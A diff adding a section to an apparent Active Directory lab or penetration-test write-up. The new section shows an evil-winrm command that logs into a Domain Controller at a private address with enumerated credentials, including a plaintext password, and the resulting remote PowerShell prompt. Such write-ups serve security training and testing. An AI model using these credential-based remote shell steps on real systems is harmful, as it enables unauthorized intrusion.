@@ -121,3 +121,12 @@ Using the usernames previously enumerated, several attacks were launched to gain
   ```
   
   >  Valid credentials discovered — clark.kent is a domain user.
+
+### Shell Access via Evil-WinRM
+
+```bash
+evil-winrm -i 192.168.50.129 -u clark.kent -p '3edcxsw2#EDCXSW@'
+
+*Evil-WinRM* PS C:\Users\clark.kent\Documents>
+```
+> Shell access gained on the Domain Controller as a low-privileged user.
